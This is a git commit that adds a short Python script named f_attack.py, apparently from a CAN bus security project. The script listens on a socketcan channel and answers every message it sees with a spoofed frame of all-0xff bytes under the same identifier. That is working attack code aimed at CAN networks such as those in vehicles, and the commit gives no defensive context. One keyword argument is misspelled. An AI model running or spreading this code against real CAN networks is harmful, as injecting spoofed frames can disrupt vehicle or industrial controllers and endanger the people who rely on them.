897e9fc40de5999d45c26f911b7cceea2963d339
JeakeG <123jakeguidry@gmail.com>
2024-03-05 13:42:19 -0600

    added script for f_attack

---
+++ scripts/f_attack.py
@@ -0,0 +1,6 @@
+import can
+
+with can.Bus(interface="socketcan", channel="can0", recieve_own_messages=False) as bus:
+    for msg in bus:
+        new_msg = can.Message(arbitration_id=msg.arbitration_id, data=[0xff]*8)
+        bus.send(new_msg)
